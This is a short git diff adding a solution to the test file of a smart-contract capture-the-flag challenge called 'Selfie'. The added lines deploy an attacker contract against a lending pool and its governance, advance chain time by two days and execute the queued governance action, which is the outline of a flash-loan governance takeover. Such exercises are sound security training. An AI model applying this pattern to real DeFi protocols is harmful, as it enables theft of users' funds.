@@ -38,6 +38,11 @@ describe('[Challenge] Selfie', function () {
     });
 
     it('Execution', async function () {
+        const SelfieAttacker = await ethers.getContractFactory('SelfieHack');
+        const selfieAttacker = await SelfieAttacker.connect(player).deploy(pool.address, governance.address);
+        await selfieAttacker.attack();
+        await ethers.provider.send("evm_increaseTime", [172800]);
+        await governance.executeAction(1);
         /** CODE YOUR SOLUTION HERE */
     });
 
